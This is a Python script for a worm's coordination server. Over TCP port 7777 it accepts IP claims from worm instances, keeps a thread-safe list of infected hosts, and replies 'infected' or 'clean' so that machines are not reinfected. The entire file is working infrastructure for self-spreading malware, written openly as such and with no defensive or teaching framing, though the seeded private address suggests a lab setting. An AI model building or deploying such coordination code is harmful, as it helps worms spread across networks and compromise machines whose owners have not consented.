import socket
import json
import threading

COORDINATOR_PORT = 7777
infected_list = ["192.168.100.10"]
lock = threading.Lock()#simple coordinator that keeps track of infected hosts to prevent reinfection. It listens for incoming connections from worms trying to claim an IP address. If the IP is already in the infected list, it responds with "infected". If the IP is clean, it adds it to the list and responds with "clean". The coordinator uses a lock to ensure thread-safe access to the infected list and prints status messages for each claim attempt.

print("[*] Coordinator running on port 7777")
print(f"[*] Starting fresh — infected list: {infected_list}")

#handle function that processes incoming connections. It reads the data, decodes the JSON message, and checks if the claimed IP is already infected. It sends the appropriate response back to the client and updates the infected list if necessary, while printing the status of each claim attempt.
def handle(conn):
    data = b""
    while True:
        chunk = conn.recv(4096)
        if not chunk:
            break
        data += chunk

    try:
        msg = json.loads(data.decode())
        ip = msg["ip"]

        with lock:
            if ip in infected_list:
                conn.sendall(b"infected")
                print(f"[~] {ip} already infected — rejected")
            else:
                infected_list.append(ip)
                conn.sendall(b"clean")
                print(f"[+] {ip} claimed — infected list: {infected_list}")
    except Exception as e:
        print(f"[-] Error: {e}")

    conn.close()

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", COORDINATOR_PORT))
s.listen(20)

while True:
    conn, _ = s.accept()
    threading.Thread(target=handle, args=(conn,), daemon=True).start()